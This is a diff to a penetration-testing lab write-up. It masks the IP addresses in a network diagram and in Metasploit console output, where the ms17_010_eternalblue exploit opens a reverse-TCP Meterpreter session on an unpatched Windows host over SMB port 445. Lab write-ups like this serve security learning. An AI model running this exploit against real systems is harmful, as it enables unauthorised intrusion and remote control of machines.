@@ -20,9 +20,9 @@
 │                  │         │   SP1 x64 (unpatched) │
 │  eth0 → NAT      │         │                        │
 │  (internet)      │         │  eth0 → Host-only      │
-│                  │         │  192.168.56.102        │
+│                  │         │  192.***.**.***     │
 │  eth1 → Host-only │◄───────►│                        │
-│  192.168.56.101  │  SMB/445│                        │
+│  192.***.**.***  │  SMB/445│                        │
 └─────────────────┘         └──────────────────────┘
 ```
 
@@ -82,9 +82,9 @@ After this, `ms17_010_eternalblue` ran successfully and returned a Meterpreter s
 
 ```
 msf exploit(windows/smb/ms17_010_eternalblue) > run
-[*] Started reverse TCP handler on 192.168.56.101:4444
+[*] Started reverse TCP handler on 192.***.**.***:4444
 ...
-[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102)
+[*] Meterpreter session 1 opened (192.***.**.***:4444 -> 192.***.**.***)
 ```
 
 ## 6. Key Takeaways
